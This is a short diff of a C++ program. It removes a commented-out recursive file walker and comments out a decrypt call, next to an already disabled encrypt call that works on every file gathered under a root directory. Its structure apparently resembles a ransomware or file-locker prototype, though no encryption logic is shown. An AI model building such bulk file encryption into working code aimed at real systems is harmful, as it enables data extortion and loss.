@@ -13,18 +13,6 @@
 
 namespace filesystem = std::filesystem;
 
-//void get_files(std::vector<std::string>& paths, std::string root_path)
-//{
-//
-//	for (const auto& file : filesystem::directory_iterator(root_path))
-//	{
-//		if (filesystem::is_directory(file))
-//		{
-//			get_files(paths, file.path().string());
-//		}
-//	}
-//}
-
 void get_files(std::vector<std::filesystem::path>& paths, LPCTSTR root_path)  //get all files in root dir
 {
 	CStringA stringA(root_path);
@@ -85,7 +73,7 @@ int main()
 	  fill_paths(paths);
 
 	 // encrypt(paths);
-	  decrypt(paths);
+	  //decrypt(paths);
 }
 
 
